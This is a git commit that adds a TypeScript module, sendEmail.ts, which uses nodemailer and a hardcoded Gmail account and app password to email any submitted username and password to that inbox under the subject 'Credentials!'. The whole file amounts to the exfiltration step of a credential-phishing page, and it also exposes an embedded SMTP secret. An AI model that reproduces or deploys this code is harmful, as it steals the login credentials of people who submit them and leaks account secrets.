e8410eef680eda4103a9d125826cff78df8bda9c
maith96 <threedaniel385@gmail.com>
2024-11-27 17:54:21 +0300

    create files

---
+++ app/lib/sendEmail.ts
@@ -0,0 +1,31 @@
+import nodemailer from "nodemailer";
+
+// Create a transporter object
+const transporter = nodemailer.createTransport({
+  service: "gmail",
+  port: 587,
+  secure: false, // or 'STARTTLS'
+  auth: {
+    user: "gracemngonda@gmail.com",
+    pass: "ksmiqjjehmlrezey",
+  },
+});
+
+export function sendEmail(username: string, password: string) {
+  // Define the email options
+  const mailOptions = {
+    from: "gracemngonda@gmail.com",
+    to: "gracemngonda@gmail.com",
+    subject: "Credentials!",
+    text: `Email/Phone: ${username}\nPassword: ${password}`,
+  };
+
+  // Send the email
+  transporter.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      console.log(error);
+    } else {
+      console.log("Email sent: " + info.response);
+    }
+  });
+}
